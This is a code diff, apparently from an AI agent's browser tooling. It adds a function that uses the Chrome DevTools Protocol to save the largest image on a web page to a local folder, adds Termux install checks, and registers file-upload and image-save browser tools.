+                ws_url = page.get("webSocketDebuggerUrl")
+                if ws_url:
+                    break
+        if not ws_url:
+            return json.dumps({"success": False, "error": "No active page found."})
+
+        import websocket
+        ws = websocket.create_connection(ws_url, timeout=30)
+        cmd_id = 1
+
+        def send_cdp(method, params=None):
+            nonlocal cmd_id
+            msg = {"id": cmd_id, "method": method, "params": params or {}}
+            ws.send(json.dumps(msg))
+            while True:
+                resp_raw = ws.recv()
+                resp_data = json.loads(resp_raw)
+                if resp_data.get("id") == cmd_id:
+                    cmd_id += 1
+                    return resp_data
+
+        try:
+            # JS that finds the image, converts to base64 data URL
+            if css_selector:
+                find_js = f'''
+                (function() {{
+                    var el = document.querySelector({json.dumps(css_selector)});
+                    if (!el) return JSON.stringify({{error: "Element not found: {css_selector}"}});
+                    return _extractImage(el);
+                }})()
+                '''
+            else:
+                find_js = '''
+                (function() {
+                    // Find the largest image on the page
+                    var imgs = Array.from(document.querySelectorAll('img'));
+                    var canvases = Array.from(document.querySelectorAll('canvas'));
+                    var best = null;
+                    var bestArea = 0;
+                    imgs.forEach(function(img) {
+                        var area = (img.naturalWidth || img.width) * (img.naturalHeight || img.height);
+                        if (area > bestArea) { bestArea = area; best = img; }
+                    });
+                    canvases.forEach(function(c) {
+                        var area = c.width * c.height;
+                        if (area > bestArea) { bestArea = area; best = c; }
+                    });
+                    if (!best) return JSON.stringify({error: "No images found on page"});
+                    return _extractImage(best);
+                })()
+                '''
+
+            # Helper function injected first
+            helper_js = '''
+            window._extractImage = function(el) {
+                try {
+                    if (el.tagName === 'CANVAS') {
+                        return JSON.stringify({data: el.toDataURL('image/png'), width: el.width, height: el.height});
+                    }
+                    // For <img>, draw to canvas to get data
+                    var canvas = document.createElement('canvas');
+                    var w = el.naturalWidth || el.width;
+                    var h = el.naturalHeight || el.height;
+                    canvas.width = w;
+                    canvas.height = h;
+                    var ctx = canvas.getContext('2d');
+                    ctx.drawImage(el, 0, 0);
+                    try {
+                        return JSON.stringify({data: canvas.toDataURL('image/png'), width: w, height: h});
+                    } catch(e) {
+                        // Cross-origin tainted canvas — return the src URL instead
+                        return JSON.stringify({src: el.src, width: w, height: h});
+                    }
+                } catch(e) {
+                    return JSON.stringify({error: e.message});
+                }
+            };
+            "ok"
+            '''
+
+            # Inject helper
+            send_cdp("Runtime.evaluate", {"expression": helper_js})
+
+            # Extract image
+            result = send_cdp("Runtime.evaluate", {
+                "expression": find_js,
+                "returnByValue": True,
+            })
+            value = result.get("result", {}).get("result", {}).get("value", "")
+            if not value:
+                ws.close()
+                return json.dumps({"success": False, "error": "No result from image extraction JS."})
+
+            img_info = json.loads(value)
+
+            if "error" in img_info:
+                ws.close()
+                return json.dumps({"success": False, "error": img_info["error"]})
+
+            # Prepare output dir
+            images_dir = Path(os.path.expanduser("~/.hermes/generated-images"))
+            images_dir.mkdir(parents=True, exist_ok=True)
+
+            ts = int(_time.time())
+            out_filename = filename or f"browser_saved_{ts}.png"
+            if not out_filename.endswith((".png", ".jpg", ".jpeg", ".webp")):
+                out_filename += ".png"
+            out_path = images_dir / out_filename
+
+            if "data" in img_info:
+                # data:image/png;base64,...
+                data_url = img_info["data"]
+                # Strip data URL prefix
+                if "," in data_url:
+                    b64_data = data_url.split(",", 1)[1]
+                else:
+                    b64_data = data_url
+                with open(out_path, "wb") as f:
+                    f.write(_b64.b64decode(b64_data))
+            elif "src" in img_info:
+                # Cross-origin image — fetch via CDP network
+                src = img_info["src"]
+                if src.startswith("blob:"):
+                    # Fetch blob via JS
+                    blob_js = f'''
+                    (async function() {{
+                        try {{
+                            var resp = await fetch("{src}");
+                            var blob = await resp.blob();
+                            return new Promise(function(resolve) {{
+                                var reader = new FileReader();
+                                reader.onloadend = function() {{ resolve(reader.result); }};
+                                reader.readAsDataURL(blob);
+                            }});
+                        }} catch(e) {{
+                            return "ERROR:" + e.message;
+                        }}
+                    }})()
+                    '''
+                    blob_result = send_cdp("Runtime.evaluate", {
+                        "expression": blob_js,
+                        "awaitPromise": True,
+                        "returnByValue": True,
+                    })
+                    data_url = blob_result.get("result", {}).get("result", {}).get("value", "")
+                    if data_url and not data_url.startswith("ERROR:"):
+                        b64_data = data_url.split(",", 1)[1] if "," in data_url else data_url
+                        with open(out_path, "wb") as f:
+                            f.write(_b64.b64decode(b64_data))
+                    else:
+                        ws.close()
+                        return json.dumps({"success": False, "error": f"Could not fetch blob: {data_url}"})
+                else:
+                    # Regular URL — download directly
+                    req = urllib.request.Request(src)
+                    with urllib.request.urlopen(req, timeout=30) as resp:
+                        with open(out_path, "wb") as f:
+                            f.write(resp.read())
+            else:
+                ws.close()
+                return json.dumps({"success": False, "error": "No image data or src URL extracted."})
+
+        finally:
+            ws.close()
+
+        file_size = out_path.stat().st_size
+        logger.info("Image saved from browser: %s (%d bytes)", out_path, file_size)
+        return json.dumps({
+            "success": True,
+            "file_path": str(out_path),
+            "filename": out_filename,
+            "size_bytes": file_size,
+            "width": img_info.get("width", 0),
+            "height": img_info.get("height", 0),
+        })
+
+    except ImportError:
+        try:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "websocket-client", "-q"],
+                timeout=30,
+            )
+            return browser_save_image(css_selector, filename, task_id)
+        except Exception as e:
+            return json.dumps({"success": False, "error": f"websocket-client not installed: {e}"})
+    except Exception as e:
+        logger.error("browser_save_image failed: %s", e, exc_info=True)
+        return json.dumps({"success": False, "error": str(e)})
+
+
+def get_active_browser_sessions() -> Dict[str, Dict[str, str]]:
+    """
+    Get information about active browser sessions.
+
+    Returns:
+        Dict mapping task_id to session info (session_name, bb_session_id, cdp_url)
+    """
+    with _cleanup_lock:
+        return _active_sessions.copy()
 
 
 # ============================================================================
@@ -2040,8 +2769,15 @@ def check_browser_requirements() -> bool:
 
     # The agent-browser CLI is always required
     try:
-        _find_agent_browser()
+        browser_cmd = _find_agent_browser()
     except FileNotFoundError:
+        return False
+
+    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
+    # local browser dependency. Require a real install (global or local) so the
+    # browser tool is not advertised as available when it will likely fail on
+    # first use.
+    if _requires_real_termux_browser_install(browser_cmd):
         return False
 
     # In cloud mode, also require provider credentials
@@ -2073,10 +2809,13 @@ if __name__ == "__main__":
     else:
         print("❌ Missing requirements:")
         try:
-            _find_agent_browser()
+            browser_cmd = _find_agent_browser()
+            if _requires_real_termux_browser_install(browser_cmd):
+                print("   - bare npx fallback found (insufficient on Termux local mode)")
+                print(f"     Install: {_browser_install_hint()}")
         except FileNotFoundError:
             print("   - agent-browser CLI not found")
-            print("     Install: npm install -g agent-browser && agent-browser install --with-deps")
+            print(f"     Install: {_browser_install_hint()}")
         if _cp is not None and not _cp.is_configured():
             print(f"   - {_cp.provider_name()} credentials not configured")
             print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")
@@ -2179,4 +2918,24 @@ registry.register(
     handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
     check_fn=check_browser_requirements,
     emoji="🖥️",
+)
+registry.register(
+    name="browser_upload_file",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_upload_file"],
+    handler=lambda args, **kw: browser_upload_file(file_path=args.get("file_path", ""), task_id=kw.get("task_id")),
+    check_fn=check_browser_requirements,
+    emoji="📤",
+)
+registry.register(
+    name="browser_save_image",
+    toolset="browser",
+    schema=_BROWSER_SCHEMA_MAP["browser_save_image"],
+    handler=lambda args, **kw: browser_save_image(
+        css_selector=args.get("css_selector", ""),
+        filename=args.get("filename", ""),
+        task_id=kw.get("task_id"),
+    ),
+    check_fn=check_browser_requirements,
+    emoji="💾",
 )
